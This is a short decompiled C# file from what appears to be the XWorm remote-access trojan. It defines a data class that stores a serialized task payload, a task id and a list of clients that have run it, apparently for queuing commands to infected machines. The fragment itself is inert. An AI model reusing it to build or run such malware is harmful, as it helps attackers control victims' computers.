using System;
using System.Collections.Generic;

namespace XWorm
{
	// Token: 0x02000040 RID: 64
	public class XWormTask
	{
		// Token: 0x06000A0A RID: 2570 RVA: 0x00058D50 File Offset: 0x00056F50
		public XWormTask(byte[] _msgPack, string _id)
		{
			this.msgPack = _msgPack;
			this.id = _id;
			this.doneClient = new List<string>();
		}

		// Token: 0x0400043F RID: 1087
		public byte[] msgPack;

		// Token: 0x04000440 RID: 1088
		public string id;

		// Token: 0x04000441 RID: 1089
		public List<string> doneClient;
	}
}
